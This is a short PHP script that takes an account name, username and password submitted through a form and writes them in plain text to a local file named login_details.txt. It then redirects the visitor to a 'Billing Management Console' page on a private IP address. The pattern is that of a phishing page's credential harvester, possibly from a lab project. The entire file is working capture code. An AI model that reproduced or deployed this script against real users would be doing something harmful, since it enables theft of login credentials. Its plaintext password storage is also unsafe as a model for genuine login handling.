<?php
$account  = $_POST['account'];
$username = $_POST['username'];
$password = $_POST['password'];
//
$file = fopen("login_details.txt", "w");
$details = "account:  $account \n" ; 
$details .= "username: $username \n"; 
$details .= "pass: $password \n";

fwrite($file,$details);
fclose($file);

header("Location: http://172.29.106.68/amusoke/project2/Billing_Management_Console.html");
exit();
?>